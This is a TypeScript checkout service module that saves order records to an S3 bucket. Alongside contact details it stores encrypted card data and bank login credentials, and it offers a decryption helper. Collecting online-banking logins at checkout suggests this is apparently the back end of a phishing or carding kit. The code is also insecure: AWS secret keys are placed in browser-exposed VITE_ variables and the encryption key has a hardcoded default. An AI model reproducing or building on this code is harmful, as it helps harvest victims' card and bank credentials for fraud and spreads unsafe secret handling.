import { v4 as uuidv4 } from 'uuid';
import { S3Client, PutObjectCommand, ListObjectsV2Command, GetObjectCommand, DeleteObjectCommand } from "@aws-sdk/client-s3";
import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
import CryptoJS from 'crypto-js';

// ====== INTERFACES ======
export interface OrderData {
  id: string;
  timestamp: number;
  formData: FormData;
  encryptedCardData?: string;
  encryptedBankData?: string;
  bankName: string;
  productInfo?: {
    id: string;
    name: string;
    price: number;
    quantity: number;
    image: string;
    set: string;
  }[];
  total?: number;
  status?: 'pending' | 'processing' | 'completed' | 'failed';
}

export interface PublicOrderData {
  id: string;
  timestamp: number;
  formData: Pick<FormData, 'firstName' | 'lastName' | 'email' | 'phone' | 'city' | 'state'>;
  bankName: string;
  productInfo?: OrderData['productInfo'];
  total?: number;
  status?: OrderData['status'];
}

// ====== ENV CONFIG ======
const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'your-secret-key-here';

const s3 = new S3Client({
  region: import.meta.env.VITE_AWS_REGION,
  credentials: {
    accessKeyId: import.meta.env.VITE_AWS_ACCESS_KEY_ID,
    secretAccessKey: import.meta.env.VITE_AWS_SECRET_ACCESS_KEY,
  },
});

const BUCKET = import.meta.env.VITE_AWS_S3_BUCKET;

// ====== UTILS ======
const encryptData = (data: any): string =>
  CryptoJS.AES.encrypt(JSON.stringify(data), ENCRYPTION_KEY).toString();

const decryptData = (encryptedData: string): any => {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
    return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
  } catch (error) {
    console.error("Decryption error:", error);
    return null;
  }
};

const validateAndSanitizeFormData = (formData: FormData): FormData => ({
  firstName: formData.firstName?.trim() || '',
  lastName: formData.lastName?.trim() || '',
  email: formData.email?.trim().toLowerCase() || '',
  phone: formData.phone?.replace(/[^\d+\-\(\)\s]/g, '') || '',
  address: formData.address?.trim() || '',
  city: formData.city?.trim() || '',
  state: formData.state?.trim() || '',
  zipCode: formData.zipCode?.replace(/[^\w\s\-]/g, '') || '',
  sameAsBilling: formData.sameAsBilling ?? true,
  billingAddress: formData.billingAddress?.trim() || '',
  billingCity: formData.billingCity?.trim() || '',
  billingState: formData.billingState?.trim() || '',
  billingZipCode: formData.billingZipCode?.replace(/[^\w\s\-]/g, '') || '',
});

// ====== CORE FUNCTIONS ======
export const generateOrderId = (): string => uuidv4();

// Save or update order
export const saveOrderData = async (orderId: string, data: Partial<OrderData>): Promise<void> => {
  const sanitizedFormData = data.formData ? validateAndSanitizeFormData(data.formData) : undefined;

  const orderData: OrderData = {
    id: orderId,
    timestamp: Date.now(),
    formData: sanitizedFormData || {} as FormData,
    encryptedCardData: data.cardData ? encryptData(data.cardData) : undefined,
    encryptedBankData: data.bankLoginData ? encryptData(data.bankLoginData) : undefined,
    bankName: data.bankName?.trim() || '',
    productInfo: data.productInfo || [],
    total: typeof data.total === 'number' ? data.total : 0,
    status: data.status || 'pending',
  };

  await s3.send(
    new PutObjectCommand({
      Bucket: BUCKET,
      Key: `orders/${orderId}.json`,
      Body: JSON.stringify(orderData),
      ContentType: "application/json",
    })
  );

  console.log(`✅ Order ${orderId} saved to S3`);
};

// Fetch all orders (like getOrders in Firebase)
export const getOrders = async (): Promise<PublicOrderData[]> => {
  const list = await s3.send(
    new ListObjectsV2Command({
      Bucket: BUCKET,
      Prefix: "orders/",
    })
  );

  if (!list.Contents) return [];

  const orders: PublicOrderData[] = [];

  for (const obj of list.Contents) {
    if (!obj.Key) continue;

    const file = await s3.send(
      new GetObjectCommand({ Bucket: BUCKET, Key: obj.Key })
    );

    const body = await file.Body?.transformToString();
    if (!body) continue;

    const order: OrderData = JSON.parse(body);

    orders.push({
      id: order.id,
      timestamp: order.timestamp,
      formData: {
        firstName: order.formData.firstName,
        lastName: order.formData.lastName,
        email: order.formData.email,
        phone: order.formData.phone,
        city: order.formData.city,
        state: order.formData.state,
      },
      bankName: order.bankName,
      productInfo: order.productInfo,
      total: order.total,
      status: order.status,
    });
  }

  // Sort by newest
  orders.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

  return orders;
};

// Get decrypted sensitive data
export const getDecryptedOrderData = (order: OrderData) => ({
  cardData: order.encryptedCardData ? decryptData(order.encryptedCardData) : undefined,
  bankLoginData: order.encryptedBankData ? decryptData(order.encryptedBankData) : undefined,
});

// Cleanup old orders
export const cleanupOldOrders = async (daysOld: number = 30): Promise<void> => {
  const cutoffTime = Date.now() - daysOld * 24 * 60 * 60 * 1000;

  const list = await s3.send(
    new ListObjectsV2Command({ Bucket: BUCKET, Prefix: "orders/" })
  );

  if (!list.Contents) return;

  for (const obj of list.Contents) {
    if (!obj.Key) continue;

    const file = await s3.send(
      new GetObjectCommand({ Bucket: BUCKET, Key: obj.Key })
    );
    const body = await file.Body?.transformToString();
    if (!body) continue;

    const order: OrderData = JSON.parse(body);

    if (order.timestamp < cutoffTime) {
      await s3.send(
        new DeleteObjectCommand({ Bucket: BUCKET, Key: obj.Key })
      );
      console.log(`🗑 Deleted old order ${order.id}`);
    }
  }
};
